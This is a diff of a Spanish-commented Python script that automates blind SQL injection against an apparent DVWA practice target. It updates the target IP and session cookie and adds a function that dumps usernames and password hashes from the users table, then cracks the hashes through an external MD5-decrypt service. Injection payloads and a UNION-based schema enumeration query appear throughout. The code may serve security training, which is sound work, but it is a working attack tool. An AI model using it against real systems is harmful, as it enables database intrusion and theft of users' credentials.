@@ -11,13 +11,11 @@ class Programa():
     
     def __init__(self): 
         # URL para peticiones SQL Blind
-        self.url='http://192.168.1.52:1234/vulnerabilities/sqli_blind/'
-
-        #self.url='http://{}/vulnerabilities/sqli_blind/'.format(IP)  <-- Argsparse y así cualquier IP
+        self.url='http://192.168.1.146:1234/vulnerabilities/sqli_blind/'
 
         self.abecedario_hexadecimal='abcdef0123456789'
         self.abecedario='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
-        self.cookie_session='gha62i78ggcgud7ib1ms05fl31'
+        self.cookie_session='77mlsdl6ubsif0jmrjggmmkou2'
         self.nivel='medium'
 
         self.url_md5_decrypt = "https://md5.pinasthika.com/api/decrypt"
@@ -93,7 +91,7 @@ class Programa():
     def longitudCampoIDtablaCampo(self, id, tabla, campo, campoConocido):
         for i in range(1, 100):
             sentencia = "0 or exists(select {campo} from {tabla} where {campoConocido}={id} and length({campo}) = {i})".format(i=i+1, campo=campo, tabla=tabla, campoConocido=campoConocido, id=id)
-            print(sentencia)
+            #print(sentencia)
             existe = self.ejecutarSQL(sentencia)
             if existe:
                 return i+2
@@ -121,8 +119,6 @@ class Programa():
         print('[{asterisco}] - Sacando datos de la tabla {tabla} de la columna {columna}'.format(asterisco=self.color('*', 'amarillo'), tabla=tabla, columna=columna))
         contador_null = 0
         nombres = []
-        print(tabla)
-        print(columna)
         cantidad_registros_en_tabla = self.cantidadTuplasEnTapla(tabla, columna)        
         if cantidad_registros_en_tabla > 0:
             print('[{asterisco}] - {mensaje} {num} {mensaje2} {tabla}'.format(asterisco=self.color('*', 'verde', True), mensaje=self.color('Se han encontrado', 'verde', True), num=cantidad_registros_en_tabla, mensaje2=self.color('registros en la tabla', 'verde'), tabla=tabla))
@@ -176,17 +172,29 @@ class Programa():
         # 1' union all select table_schema,table_name FROM information_schema.tables WHERE table_schema != "mysql" AND table_schema != "information_schema" -- 
         pass
 
+    def mostrarUserPass(self):
+        nombres = self.sacarValorPorTablaColumnaID(tabla='users', columna='user', nombre_campo_id='user_id')
+        password = self.sacarValorPorTablaColumnaID(tabla='users', columna='password', nombre_campo_id='user_id')
+        contador = 0
+        for passw in password:
+            pass_dec = self.md5_decrypt(passw)
+            print('[{asterisco}] - {titulo_user}: {user}\t- {titulo_passw}: {passw}\t- {titulo_password_limpia}: {pass_limpia}'.format(asterisco=self.color('*', 'verde', True), titulo_user=self.color('User', 'verde', True), user=self.color(nombres[contador], 'verde', True), titulo_passw=self.color('Password', 'verde', True), passw=self.color(passw, 'verde', True), titulo_password_limpia=self.color('Password Limpia', 'verde', True), pass_limpia=self.color(pass_dec, 'verde', True)))
+            contador += 1
+
 if __name__ == "__main__":
     init() # Init de Colorama
     programa = Programa()
-    #nombres = programa.sacarValorPorTablaColumnaID(tabla='users', columna='user', nombre_campo_id='user_id')
-    #password = programa.sacarValorPorTablaColumnaID(tabla='users', columna='password', nombre_campo_id='user_id')
-    #contador = 0
-    #for passw in password:
-        #pass_dec = programa.md5_decrypt(passw)
-        #print('[{asterisco}] - {titulo_user}: {user}\t- {titulo_passw}: {passw}\t- {titulo_password_limpia}: {pass_limpia}'.format(asterisco=programa.color('*', 'verde', True), titulo_user=programa.color('User', 'verde', True), user=programa.color(nombres[contador], 'verde', True), titulo_passw=programa.color('Password', 'verde', True), passw=programa.color(passw, 'verde', True), titulo_password_limpia=programa.color('Password Limpia', 'verde', True), pass_limpia=programa.color(pass_dec, 'verde', True)))
-        #contador += 1
-    nombres = programa.sacarValorPorTablaColumnaID(tabla='information_schema.tables', columna='table_name', nombre_campo_id='table_name')
-    print(nombres)
+    #programa.mostrarUserPass()
+
+    #nombres = programa.sacarValorPorTablaColumnaID(tabla='information_schema.tables', columna='table_name', nombre_campo_id='table_name')
+    #print(nombres)
     #columnsname = programa.cogerColumnasTabla(tabla='information_schema.columns', tabla_name='table_name')
     #print(columnsname)
+
+    sentencia="0 or exists(select user from users where user_id=1)"
+
+    result = programa.ejecutarSQL(sentencia)
+    if result:
+        print(programa.color('Todo OK\t-\t[{}]'.format(sentencia), 'verde', True))
+    else:
+        print(programa.color('Consulta mal hecha\t-\t[{}]'.format(sentencia), 'rojo', True))
